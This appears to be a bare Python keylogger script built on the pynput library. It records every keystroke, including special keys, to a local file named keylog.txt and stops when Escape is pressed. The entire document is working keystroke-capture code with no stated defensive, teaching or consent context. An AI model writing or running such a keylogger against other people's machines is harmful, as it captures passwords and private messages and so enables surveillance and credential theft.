from pynput import keyboard

# Define the file where the keystrokes will be logged
log_file = "keylog.txt"

def on_press(key):
    try:
        # Record the key pressed (handling special keys like Enter, Space, etc.)
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # If a special key is pressed (like Enter, Backspace, etc.), record its name
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop the keylogger if the Escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    